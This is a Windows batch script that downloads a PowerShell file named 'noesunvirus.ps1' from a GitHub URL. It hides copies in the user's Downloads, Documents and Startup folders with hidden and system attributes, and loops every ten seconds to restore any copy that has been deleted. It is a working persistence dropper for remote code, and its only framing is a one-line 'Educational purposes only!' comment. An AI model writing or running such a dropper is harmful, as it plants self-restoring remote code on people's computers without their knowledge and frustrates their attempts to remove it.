@echo off

powershell -WindowStyle Hidden -Command ""

set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/penepenepenepene/main/noesunvirus.ps1

set scriptPath1=%userprofile%\Downloads\noesunvirus.ps1
set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1

:checkloop
if not exist "%scriptPath1%" (
    echo Script missing from %scriptPath1%. Re-downloading...
    powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%'"
    attrib +h +s "%scriptPath1%"
)

if not exist "%scriptPath2%" (
    echo Script missing from %scriptPath2%. Recreating...
    copy "%scriptPath1%" "%scriptPath2%"
    attrib +h +s "%scriptPath2%"
)

if not exist "%scriptPath3%" (
    echo Script missing from %scriptPath3%. Recreating...
    copy "%scriptPath1%" "%scriptPath3%"
    attrib +h +s "%scriptPath3%"
)

timeout /t 10 >nul

goto checkloop

:: Educational purposes only!
